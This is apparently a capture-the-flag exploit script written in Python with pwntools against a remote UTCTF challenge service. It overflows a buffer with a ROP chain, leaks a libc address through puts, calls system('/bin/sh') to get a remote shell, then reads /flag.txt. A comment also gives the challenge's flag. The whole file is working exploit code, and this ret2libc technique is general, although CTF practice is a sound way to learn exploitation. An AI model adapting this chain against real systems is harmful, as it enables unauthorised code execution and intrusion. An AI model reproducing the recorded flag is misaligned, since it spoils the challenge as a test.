#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./shellcode_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b *0x40063c")
p = remote("challenge.utctf.live", 9009)

BSS = 0x601f00

rop = ROP(elf)
rop.raw(p64(BSS) * (0x48 // 8))
rop.puts(elf.got["puts"])
rop.raw(elf.sym["main"])
p.sendlineafter(b"here>: \n", rop.chain())

leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]
#log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(p64(BSS) * (0x48 // 8))
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendlineafter(b"here>: \n", rop.chain())

p.sendline(b"/bin/cat /flag.txt")

print(p.readuntil(b"}").decode()) # utflag{i_should_be_doing_ccdc_rn}
